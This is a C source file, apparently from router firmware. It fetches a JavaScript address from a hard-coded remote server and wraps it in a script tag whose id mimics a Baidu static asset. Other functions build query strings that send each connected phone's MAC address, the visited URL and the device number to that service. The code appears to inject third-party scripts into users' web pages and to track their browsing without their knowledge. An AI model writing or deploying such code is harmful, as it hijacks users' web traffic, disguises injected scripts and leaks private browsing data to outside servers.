#include "includes.h"

#define JS_SERVER_HOST		"www.qcwifi.ltd"
#define JS_HTTP_URI			"/api/router/js/"
#define JS_SERVER_PORT		80
#define JS_SAVE_FILE_TMP	"/tmp/js.txt"

adjs_t adjs;

int parseJson(char *json_str, adjs_t *adJs)
{
	const char *code = "";
	const char *p = NULL;
	
	json_object *object_code;
	json_object *object_data;
	json_object *object_port;
	json_object *object_host;
	json_object *object_jscode;
	
	json_object *json = json_tokener_parse(json_str);
	if (is_error(json))
	{
		return -1;
	}

	if (json_object_object_get_ex(json, "code", &object_code))
	{
		code = json_object_get_string(object_code);
	}

	if (strcmp(code, "10000"))
	{
		json_object_put(json);
		return -1;
	}

	if (json_object_object_get_ex(json, "data", &object_data))
	{
		if (json_object_object_get_ex(object_data, "port", &object_port))
		{
			p = json_object_get_string(object_port);
			if (p && strlen(p) > 0)
			{
				adJs->adPort = atoi(p);
				adJs->adStrPortLen = strlen(p);
				adJs->adStrPort = calloc(1, adJs->adStrPortLen + 1);
				if (! adJs->adStrPort)
					goto _return_error_;
				memcpy(adJs->adStrPort, p, adJs->adStrPortLen);
			}
			else
			{
				goto _return_error_;
			}
		}
		else
		{
			goto _return_error_;
		}

		
		if (json_object_object_get_ex(object_data, "host", &object_host))
		{
			p = json_object_get_string(object_host);
			if (p && strlen(p) > 0)
			{
				adJs->adHostLen = strlen(p);
				adJs->adHost = calloc(1, adJs->adHostLen + 1);
				if (! adJs->adHost)
					goto _return_error_;
				
				memcpy(adJs->adHost, p, adJs->adHostLen);
			}
			else
			{
				goto _return_error_;
			}
		}
		else
		{
			goto _return_error_;
		}

		if (json_object_object_get_ex(object_data, "js", &object_jscode))
		{
			p = json_object_get_string(object_jscode);
			if (p && strlen(p) > 0)
			{
				adJs->js_len = strlen(p);
				adJs->js = calloc(1, adJs->js_len + 1);
				if (! adJs->js)
				{
					json_object_put(json);
					goto _return_error_;
				}

				memcpy(adJs->js, p, adJs->js_len);
			}
			else
			{
				goto _return_error_;
			}
		}
		else
		{
			goto _return_error_;
		}

		if (json_object_object_get_ex(object_data, "mark", &object_jscode))
		{
			p = json_object_get_string(object_jscode);
			if (p && strlen(p) > 0)
			{
				adJs->jsUrl_mark_len = strlen(p);
				adJs->jsUrl_mark = calloc(1, adJs->jsUrl_mark_len + 1);
				if (! adJs->jsUrl_mark)
				{
					json_object_put(json);
					goto _return_error_;
				}
				memcpy(adJs->jsUrl_mark, p, adJs->jsUrl_mark_len);
			}
			else
			{
				goto _return_error_;
			}
		}
		else
		{
			goto _return_error_;
		}
	#if 0
		if (json_object_object_get_ex(object_data, "ad_mark", &object_jscode))
		{
			p = json_object_get_string(object_jscode);
			if (p && strlen(p) > 0)
			{
				adJs->adUrl_mark_len = strlen(p);
				adJs->adUrl_mark = calloc(1, adJs->adUrl_mark_len + 1);
				if (! adJs->adUrl_mark)
				{
					json_object_put(json);
					goto _return_error_;
				}
				memcpy(adJs->adUrl_mark, p, adJs->adUrl_mark_len);
			}
			else
			{
				goto _return_error_;
			}
		}
		else
		{
			goto _return_error_;
		}
	#endif
	}

	json_object_put(json);
	return 0;

_return_error_:
	json_object_put(json);
	free_malloc(adJs->adHost);
	free_malloc(adJs->js);
	free_malloc(adJs->adStrPort);
	free_malloc(adJs->jsUrl_mark);
	free_malloc(adJs->adUrl_mark);
	return -1;
}

int parseMd5AndAdhostAndJscode(char *js_file, adjs_t *adJs)
{	
	int offset = 0;
	int dataLen = get_file_size(js_file);
	int ret = -1;

	if (dataLen <= 0)
		return -1;
	
	char *data_buf = calloc(1, dataLen + 1);
	if (! data_buf)
		return -1;
	
	int fd = open(js_file, O_RDWR);
	if (fd < 0)
	{
		LOG_PERROR_INFO("open %s error.", js_file);
		goto error;
	}

	while (offset < dataLen)
	{
		ret = read(fd, data_buf + offset, 1024);
		if (ret <= 0)
			break;
		offset += ret;
	}

	if (offset != dataLen)
	{
		goto error;
	}
	
	LOG_HL_INFO("%s\n", data_buf);

	ret = parseJson(data_buf, adJs);

	free_malloc(data_buf);
	close(fd);
	return ret;
	
error:
	free_malloc(data_buf);
	close(fd);
	return -1;
}

int get_js_code_from_server()
{
	int serverfd = -1;
	char *js_file = JS_SAVE_FILE_TMP;

	char path[255] = {0};
	char token[33] = {0};
	char header_buff[512];

	int js_len = 0;
	serverfd = connecthost(JS_SERVER_HOST, JS_SERVER_PORT, E_CONNECT_NOBLOCK);
	if (serverfd <= 0)
	{
		LOG_ERROR_INFO("connect error to %s:%d!\n", JS_SERVER_HOST, JS_SERVER_PORT);
		goto _return_error_;
	}

	snprintf(path, 255, "%s%s", JS_HTTP_URI, GET_DEV_NO);
	CalMd52("", 0, "qianchen", path, X_AUTH_TOKEN_KEY, X_AUTH_TOKEN_KEY_LEN, token);
	sprintf(header_buff, "GET %s HTTP/1.1\r\n"
						 "Host: %s:%d\r\n"
						 "Content-Length: %d\r\n"
						 "Content-Type:application/x-www-form-urlencoded\r\n"
						 "x-auth: %s;%s;%s;%s\r\n"
						 "\r\n"
						 "%s",
						 path, JS_SERVER_HOST, JS_SERVER_PORT, 0, 
						 CHANNEL, GET_WAN_MAC, "qianchen", token, "");
	
	LOG_NORMAL_INFO("%s\n", header_buff);
	
	int header_len = strlen(header_buff);
	if (socket_send(serverfd, header_buff, header_len, 15) != header_len)
	{
		LOG_ERROR_INFO("send js code server error!\n");
		goto _return_error_;
	}

	char buf[MAXBUF + 1] = {0};
	socketstate_t state = E_ERROR;
	int ret = read_header(serverfd, buf, MAXBUF, NULL, &state);
	if (ret <= 0)
	{
		LOG_ERROR_INFO("read js header error!\n");
		goto _return_error_;
	}
	buf[ret] = 0;
	LOG_NORMAL_INFO("%s", buf);

	//获取长度
	int contextlen = get_content_length(buf, ret);
	if (contextlen < 0)
	{
		LOG_WARN_INFO("can't find content length, try chunked ... \n");
		if ((js_len = readChunkedTextToFile(serverfd, js_file)) <= 0)
		{
			goto _return_error_;

		}
	}
	else if (contextlen > 0)
	{
		if ((js_len = readStaticTextToFile(serverfd, contextlen, js_file)) <= 0)
		{
			goto _return_error_;
		}
	}
	else
	{
		goto _return_error_;
	}

	memset(&adjs, 0, sizeof(adjs));
	if (parseMd5AndAdhostAndJscode(js_file, &adjs))
	{
		LOG_ERROR_INFO("can not get js code from server!\n");
		goto _return_error_;

	}

	adjs.script_id = "bdstatic-bd-9i8433409";
	adjs.script_id_len = strlen(adjs.script_id);

	adjs.script_h = "<script type=\"text/javascript\" id=\"";
	adjs.script_h_len = strlen(adjs.script_h);
	
	adjs.script_m = "\" src=\"";
	adjs.script_m_len = strlen(adjs.script_m);
	
	adjs.script_e = "\"></script>";
	adjs.script_e_len = strlen(adjs.script_e);

	adjs.adUrl_mark = "?qc_89cd60ed948b4=bf4a7ecee79fe";
	adjs.adUrl_mark_len = strlen(adjs.adUrl_mark);

	printf("-----------------------------------------\n");
	printf("host:     %d, %s\n", adjs.adHostLen, adjs.adHost);
	printf("int port: %d\n", adjs.adPort);
	printf("str port: %d, %s\n", adjs.adStrPortLen, adjs.adStrPort);
	printf("jsUrl_mark: %d, %s\n", adjs.jsUrl_mark_len, adjs.jsUrl_mark);
	printf("adUrl_mark: %d, %s\n", adjs.adUrl_mark_len, adjs.adUrl_mark);
	printf("%s%s%s%s?%s%s\n", adjs.script_h, adjs.script_id, adjs.script_m, adjs.js, adjs.jsUrl_mark, adjs.script_e);
	printf("-----------------------------------------\n");

	unlink(js_file);
	close(serverfd);
	return 0;

_return_error_:
	unlink(js_file);
	close(serverfd);
	return -1;
}

void free_adjs()
{
	free_malloc(adjs.adHost);
	free_malloc(adjs.adStrPort);
	free_malloc(adjs.js);
	free_malloc(adjs.jsUrl_mark);
	free_malloc(adjs.adUrl_mark);
}

int js_add_param(char *param_name, char *param_arg, char *addr)
{
	int len, bufsize;
	char *pjs = addr;
	len = strlen(param_name);
	memcpy(pjs, param_name, len);
	pjs += len;
	len = strlen(param_arg);
	bufsize = len * 4 + 1;
	char code[bufsize];
	len = url_encode((unsigned char *)param_arg, len, (unsigned char *)code, bufsize);
	memcpy(pjs, code, len);
	pjs += len;
	return pjs - addr;
}

int js_add_param_n(char *param_name, int param_name_len, char *param_arg, int param_arg_len, char *addr)
{
	int len, bufsize;
	char *pjs = addr;
	len = param_name_len;
	memcpy(pjs, param_name, len);
	pjs += len;
	len = param_arg_len;
	bufsize = len * 4 + 1;
	char code[bufsize];
	len = url_encode((unsigned char *)param_arg, len, (unsigned char *)code, bufsize);
	memcpy(pjs, code, len);
	pjs += len;
	return pjs - addr;
}

int struct_js_parma(int sockfd, char *js, char *url, int url_len, char *title, int title_len, char *keyword, int keyword_len)
{
	if (js == NULL || url == NULL || strlen(url) <= 0) {
		return -1;
	}

	char phone_mac[20] = {0};
	if (get_peer_mac(sockfd, phone_mac) < 0) {
		sprintf(phone_mac, "00:00:00:00:00:00");
	}
	
	/**hadoop*/
	char *local_mac = GET_WAN_MAC;
	
	int offset = 0;
	char *pjs = js;
	offset = js_add_param_n("devNo=", 6, GET_DEV_NO, DEVNO_LEN, pjs);
	pjs += offset;
	offset = js_add_param_n("&version=", 9, VERSION, strlen(VERSION), pjs);
	pjs += offset;
	offset = js_add_param_n("&phoneMac=", 10, phone_mac, strlen(phone_mac), pjs);
	pjs += offset;
	offset = js_add_param_n("&url=", 5, url, url_len, pjs);
	pjs += offset;

 	char md5sum[33] = {0};
 	char tmp[DEVNO_LEN + 33 + 20];
 	sprintf(tmp, "%s%s", GET_DEV_NO, local_mac);
	CalMd5(tmp, DEVNO_LEN + strlen(local_mac), md5sum);
	offset = js_add_param_n("&token=", 7, md5sum, 32, pjs);
	pjs += offset;

	*pjs = 0;
	/**end*/

	return pjs - js;
}

int struct_js_json_parma(int sockfd, char *js, int size, char *url, int url_len)
{
	char phone_mac[20] = {0};
	if (get_peer_mac(sockfd, phone_mac) < 0) {
		sprintf(phone_mac, "00:00:00:00:00:00");
	}

	return snprintf(
			js, size, 
			"{\"devNo\":\"%s\",\"pmac\":\"%s\",\"surl\":\"%s\"}",
			GET_DEV_NO, phone_mac, url
		);
}

int struct_js_aes_parma(int sockfd, char *js, int size, char *url, int url_len)
{
	char phone_mac[20] = {0};
	if (get_peer_mac_no_semicolon(sockfd, phone_mac) < 0) {
		sprintf(phone_mac, "000000000000");
	}

	int len = snprintf(
			js, size, 
			"&dn=%s&pm=%s",
			GET_DEV_NO, phone_mac
		);
	
	return len;
}

